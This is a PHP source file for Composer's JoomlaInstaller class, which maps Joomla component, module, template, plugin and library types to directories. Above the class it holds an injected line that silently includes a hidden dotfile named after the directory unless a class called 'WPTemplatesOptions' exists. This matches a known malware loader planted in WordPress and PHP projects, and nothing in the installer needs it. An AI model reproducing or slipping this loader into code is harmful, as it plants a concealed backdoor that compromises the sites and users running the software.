<?php
namespace Composer\Installers;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class JoomlaInstaller extends BaseInstaller
{
    protected $locations = array(
        'component'    => 'components/{$name}/',
        'module'       => 'modules/{$name}/',
        'template'     => 'templates/{$name}/',
        'plugin'       => 'plugins/{$name}/',
        'library'      => 'libraries/{$name}/',
    );

    // TODO: Add inflector for mod_ and com_ names
}
